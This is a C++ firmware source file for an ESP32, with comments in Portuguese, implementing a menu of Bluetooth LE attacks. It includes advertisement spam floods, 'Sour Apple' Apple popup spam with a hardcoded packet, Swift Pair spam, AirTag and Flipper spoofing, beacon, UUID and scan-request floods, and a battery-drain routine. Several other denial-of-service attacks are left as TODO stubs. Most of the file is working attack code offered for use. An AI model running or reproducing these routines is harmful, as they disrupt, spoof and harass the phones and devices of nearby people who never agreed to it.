#include "BleAttacks.h"
#include <NimBLEDevice.h>

BleAttacks::BleAttacks() {
    NimBLEDevice::init("");
}

// Helper para ataques baseados em advertisement
void BleAttacks::runAdvertisementAttack(NimBLEAdvertisementData& advData, uint32_t duration_ms) {
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setScanResponse(false);
    pAdvertising->setMinPreferred(0x06);
    pAdvertising->setMaxPreferred(0x06);

    pAdvertising->start();
    delay(duration_ms);
    pAdvertising->stop();
    Serial.println("Attack completed.");
}


// --- IMPLEMENTAÇÃO DOS ATAQUES BLE ---

// #1 BLE Spam Flood
void BleAttacks::bleSpamFlood() {
    Serial.println("Executing BLE Spam Flood for 20s...");
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->setMinPreferred(0x06);
    pAdvertising->setMaxPreferred(0x08);

    uint32_t start_time = millis();
    while(millis() - start_time < 20000) {
        NimBLEAdvertisementData advData;
        char random_data[16];
        for(int i=0; i<16; i++) random_data[i] = esp_random() % 256;
        advData.addData(std::string(random_data, 16));
        pAdvertising->setAdvertisementData(advData);
        pAdvertising->start();
        delayMicroseconds(5000);
        pAdvertising->stop();
    }
    Serial.println("BLE Spam Flood completed.");
}

// #2 Sour Apple Attack
void BleAttacks::sourAppleAttack() {
    Serial.println("Executing Sour Apple Attack for 20s...");
    uint8_t packet[] = {
        0x1A, 0xFF, 0x4C, 0x00, 0x12, 0x19, 0x06, 0x05, 0x01, 0x02, 0x03, 0x04,
        0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
        0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17
    };
    NimBLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    runAdvertisementAttack(advData, 20000);
}

// #3 Swift Pair Spam
void BleAttacks::swiftPairSpam() {
    Serial.println("Executing Swift Pair Spam for 20s...");
    uint8_t packet[] = { 0x03, 0x03, 0x52, 0xFE, 0x14, 0x16, 0x52, 0xFE, 0x01, 0x02, 0x03, 0x04, 0x05 };
    NimBLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    runAdvertisementAttack(advData, 20000);
}

// #4 AirTag Spoofing
void BleAttacks::airTagSpoofing() {
    Serial.println("Executing AirTag Spoofing for 30s...");
    uint8_t packet[] = {
      0x1A, 0xFF, 0x4C, 0x00, 0x10, 0x05, 0x1E, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00
    };
    NimBLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    runAdvertisementAttack(advData, 30000);
}

// #5 BLE Beacon Flood
void BleAttacks::bleBeaconFlood() {
    Serial.println("Executing BLE Beacon Flood for 20s...");
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    uint32_t start_time = millis();
    while(millis() - start_time < 20000) {
        NimBLEAdvertisementData advData;
        char random_uuid[16];
        for(int i=0; i<16; i++) random_uuid[i] = esp_random() % 256;
        advData.setFlags(0x06);
        advData.setManufacturerData(std::string(random_uuid, 16));
        pAdvertising->setAdvertisementData(advData);
        pAdvertising->start();
        delay(100);
        pAdvertising->stop();
    }
    Serial.println("BLE Beacon Flood completed.");
}

// #9 Flipper Zero Spoof
void BleAttacks::flipperZeroSpoof() {
    Serial.println("Executing Flipper Zero Spoof for 30s...");
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->setName("Flipper");
    runAdvertisementAttack(*pAdvertising->getAdvertisementData(), 30000);
}

// #11 Battery Drain Attack
void BleAttacks::batteryDrainAttack() {
    Serial.println("Executing Battery Drain Attack for 30s...");
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->setScanResponse(true); // Force scan responses
    runAdvertisementAttack(*pAdvertising->getAdvertisementData(), 30000);
}

// #12 UUID Flood
void BleAttacks::uuidFlood() {
    Serial.println("Executing UUID Flood for 20s...");
    uint32_t start_time = millis();
    while(millis() - start_time < 20000) {
        NimBLEAdvertisementData advData;
        NimBLEUUID uuid(esp_random());
        advData.addServiceUUID(uuid);
        runAdvertisementAttack(advData, 100);
    }
}

// Documentação para ataques pendentes
void BleAttacks::connectionSpam() { Serial.println("TODO: Connection Spam requires a target device scan first."); }
void BleAttacks::serviceDiscoveryDoS() { Serial.println("TODO: Service Discovery DoS requires a target device scan first."); }
void BleAttacks::notificationFlood() { Serial.println("TODO: Notification Flood requires a target device scan first."); }
void BleAttacks::ccSkimmerDetect() { Serial.println("TODO: CC Skimmer Detect requires sniffer logic."); }
void BleAttacks::advertisingIntervalDoS() { Serial.println("Executing Advertising Interval DoS..."); NimBLEDevice::getAdvertising()->setMinPreferred(0x06)->setMaxPreferred(0x06); runAdvertisementAttack(*NimBLEDevice::getAdvertising()->getAdvertisementData(), 20000); }
void BleAttacks::legacyBleFlood() {
    Serial.println("Executing Legacy BLE Flood for 20s...");
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    // Usa pacotes ADV_NONCONN_IND (não conectável, não escaneável)
    pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);

    uint32_t start_time = millis();
    while(millis() - start_time < 20000) {
        NimBLEAdvertisementData advData;
        char random_data[24];
        for(int i=0; i<24; i++) random_data[i] = esp_random() % 256;
        advData.addData(std::string(random_data, 24));
        pAdvertising->setAdvertisementData(advData);
        pAdvertising->start();
        delayMicroseconds(5000);
        pAdvertising->stop();
    }
    // Restaura o tipo de advertisement padrão
    pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_UND);
    Serial.println("Legacy BLE Flood completed.");
}
void BleAttacks::extendedAdvFlood() { Serial.println("TODO: Implement Extended Adv Flood (BLE 5.0)."); }
void BleAttacks::manufacturerSpam() { Serial.println("Executing Manufacturer Spam..."); bleBeaconFlood(); }
void BleAttacks::rssiManipulation() { Serial.println("RSSI Manipulation is achieved via Tx Power Spoof."); txPowerSpoof(); }
void BleAttacks::periodicAdvFlood() { Serial.println("TODO: Implement Periodic Adv Flood (BLE 5.0)."); }
void BleAttacks::gattWriteFlood() { Serial.println("TODO: GATT Write Flood requires a target device scan first."); }
void BleAttacks::readRequestFlood() { Serial.println("TODO: Read Request Flood requires a target device scan first."); }
void BleAttacks::disconnectFlood() { Serial.println("TODO: Disconnect Flood requires a target device scan first."); }
void BleAttacks::mtuNegotiationDoS() { Serial.println("TODO: MTU Negotiation DoS requires a target device scan first."); }
void BleAttacks::securityManagerDoS() { Serial.println("TODO: Security Manager DoS requires a target device scan first."); }
void BleAttacks::l2capEchoFlood() { Serial.println("TODO: L2CAP Echo Flood requires a target device scan first."); }
void BleAttacks::scanRequestFlood() {
    Serial.println("Executing Scan Request Flood for 20s...");
    NimBLEScan* pScan = NimBLEDevice::getScan();
    pScan->setActiveScan(true); // Envia Scan Requests
    pScan->setInterval(10);
    pScan->setWindow(10);

    uint32_t start_time = millis();
    while(millis() - start_time < 20000) {
        // A biblioteca NimBLE não suporta iniciar e parar a varredura em um loop tão rápido.
        // A abordagem correta é deixar a varredura ativa e ela enviará as solicitações.
        // No entanto, para um "flood", podemos simular reiniciando a varredura.
        pScan->start(1, false); // Varre por 1ms, sem bloqueio
        delay(1);
    }
    pScan->stop();
    Serial.println("Scan Request Flood completed.");
}
void BleAttacks::deviceNameSpoof() { Serial.println("Executing Device Name Spoof..."); NimBLEDevice::getAdvertising()->setName("SpoofedDevice"); runAdvertisementAttack(*NimBLEDevice::getAdvertising()->getAdvertisementData(), 20000); }
void BleAttacks::appearanceSpoof() { Serial.println("Executing Appearance Spoof..."); NimBLEDevice::getAdvertising()->setAppearance(0x0102); runAdvertisementAttack(*NimBLEDevice::getAdvertising()->getAdvertisementData(), 20000); }
void BleAttacks::txPowerSpoof() { Serial.println("Executing Tx Power Spoof..."); NimBLEDevice::getAdvertising()->setTxPower(127); runAdvertisementAttack(*NimBLEDevice::getAdvertising()->getAdvertisementData(), 20000); }
void BleAttacks::channelMapDoS() { Serial.println("TODO: Channel Map DoS requires a connection."); }
void BleAttacks::leCodedPhyFlood() { Serial.println("TODO: Implement LE Coded PHY Flood (BLE 5.0)."); }
